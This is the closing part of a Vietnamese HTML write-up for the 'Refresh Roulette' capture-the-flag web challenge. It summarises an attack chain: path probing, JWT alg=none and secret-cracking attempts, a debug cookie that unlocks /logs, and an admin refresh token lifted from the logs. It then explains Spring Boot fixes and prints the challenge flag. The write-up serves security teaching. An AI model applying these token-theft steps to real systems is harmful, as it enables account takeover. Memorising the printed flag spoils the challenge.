+<tr><td>4</td><td>Dò path → /logs 403</td><td>Wordlist đường dẫn thông dụng</td><td>403 ≠ 404 (route tồn tại)</td></tr>
+<tr><td>5</td><td>Forge token (alg=none, crack)</td><td>JWT yếu thường gặp</td><td>401 + wordlist không trúng → loại</td></tr>
+<tr><td>6</td><td>Set cookie ops_diag → đọc /logs</td><td>Lỗi #2</td><td>403 → 200</td></tr>
+<tr><td>7</td><td>Trích admin refresh token từ log</td><td>Lỗi #1 (token trên URL)</td><td>Decode: role=admin, exp còn hạn</td></tr>
+<tr><td>8</td><td>Refresh → access token admin → /profile/data</td><td>API chuẩn của app</td><td>Response có trường flag</td></tr>
+</table>
+
+<!-- ================= PHẦN 5 ================= -->
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot (ai code Java sẽ thấy quen)</h2>
+
+<h3>Lỗi #1 — Refresh token trên URL query</h3>
+<div class="spring bad-ex">
+  <div class="hd">☕ Code dạng bị sai (tương đồng với app challenge)</div>
+  <div class="bd">
+<pre><span class="fn">@GetMapping</span>(<span class="st">"/auth/refresh"</span>)
+<span class="kw">public</span> TokenResponse refresh(<span class="fn">@RequestParam</span> <span class="kw">String</span> refreshToken) {   <span class="cm">// ← lộ vào access log</span>
+    ...
+}</pre>
+  </div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Cách sửa</div>
+  <div class="bd">
+<pre><span class="cm">// 1. Token đi qua POST body (không bao giờ nằm trong URL/log)</span>
+<span class="fn">@PostMapping</span>(<span class="st">"/auth/refresh"</span>)
+<span class="kw">public</span> TokenResponse refresh(<span class="fn">@RequestBody</span> <span class="fn">@Valid</span> RefreshRequest req) { ... }
+
+<span class="cm">// 2. Filter log request: che mọi tham số nhạy cảm trước khi ghi log</span>
+<span class="kw">if</span> (uri.contains(<span class="st">"token"</span>) || uri.contains(<span class="st">"password"</span>)) {
+    log.info(<span class="st">"method={} url={} [REDACTED]"</span>, method, uri.split(<span class="st">"\\?"</span>)[0]);
+}</pre>
+  </div>
+</div>
+
+<h3>Lỗi #2 — Kiểm soát truy cập bằng cookie cứng + bundle debug lộ production</h3>
+<div class="spring">
+  <div class="hd">✅ Cách sửa</div>
+  <div class="bd">
+<pre><span class="cm">// Phân quyền bằng role thật trong JWT đã xác thực, không phải cookie cứng</span>
+<span class="fn">@PreAuthorize</span>(<span class="st">"hasRole('ADMIN')"</span>)
+<span class="fn">@GetMapping</span>(<span class="st">"/logs"</span>)
+<span class="kw">public</span> Map&lt;String, Object&gt; logs() { ... }
+
+<span class="cm">// Build pipeline: tách file dev, không deploy bundle debug</span>
+<span class="cm">// (tương đương spring.profiles.active=prod loại trừ dev-only beans)</span></pre>
+  </div>
+</div>
+
+<h3>Lỗi gốc (đúng tên flag) — Không rotate refresh token</h3>
+<div class="spring">
+  <div class="hd">✅ Rotation đúng chuẩn</div>
+  <div class="bd">
+<pre><span class="cm">// Mỗi lần refresh: vô hiệu token cũ, cấp token MỚI, phát hiện reuse thì thu hồi cả chuỗi</span>
+<span class="kw">public</span> TokenResponse refresh(String oldToken) {
+    RefreshToken old = repo.find(oldToken).orElseThrow(InvalidTokenException::<span class="kw">new</span>);
+    <span class="kw">if</span> (old.isUsed()) {   <span class="cm">// ← chống replay — lỗi của challenge nằm ở đây</span>
+        repo.revokeFamily(old.getFamilyId());
+        <span class="kw">throw new</span> InvalidTokenException();
+    }
+    old.markUsed();
+    <span class="kw">return</span> issueNewPair(old.getFamilyId());
+}</pre>
+<p class="muted">Challenge cho token sống 24h và dùng lại vô tội vạ → token "của hôm qua" vẫn mở được cửa hôm nay. Flag <code>R3fr3sh_T0k3ns_Must_R0t4t3</code> chính là lời giải thích của tác giả.</p>
+  </div>
+</div>
+
+<h3>Lỗi phụ — Token lưu trong cookie không HttpOnly</h3>
+<p class="muted">main.js đọc token trực tiếp từ <code>document.cookie</code> → cookie không set <code>HttpOnly</code>. Nếu app này có thêm lỗi XSS, token sẽ bị đánh cắp dễ dàng. Trong Spring Boot (khi dùng cookie thay vì header), nhớ: <code>ResponseCookie.from("refresh_token", t).httpOnly(true).secure(true).sameSite("Strict").build()</code>.</p>
+
+<!-- ================= PHẦN 6 ================= -->
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+<li><b>Đọc hết JS bundle trước khi tấn công.</b> main.js cho bản đồ API, dev.js cho cookie debug — cả 2 đều nằm ngoài trang chủ.</li>
+<li><b>Phân biệt 403 và 404 khi dò đường dẫn.</b> 403 = route tồn tại, đáng đầu tư thêm công sức.</li>
+<li><b>Kiểm chứng mọi giả thuyết trước khi bỏ:</b> alg=none → đọc lỗi 401; crack secret → chạy wordlist đủ lớn. Không đoán.</li>
+<li><b>Credential trên URL = credential trong log.</b> Áp dụng cho mọi tham số: token, session id, reset-password link.</li>
+<li><b>Refresh token phải rotate.</b> Lộ token cũ không được phép mở phiên mới.</li>
+<li><b>Không để artifact dev/debug đi cùng production build.</b> Kiểm tra cả /static/, source map (.js.map), endpoint actuator.</li>
+<li><b>Verify cuối cùng luôn là submit flag lên portal.</b> Mọi bước trước đó chỉ là bằng chứng gián tiếp.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag trong bài đã xác minh thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal của challenge. Chúc mừng bạn đã clear Refresh Roulette! 🎉</p>
+
+</div>
+</body>
+</html>
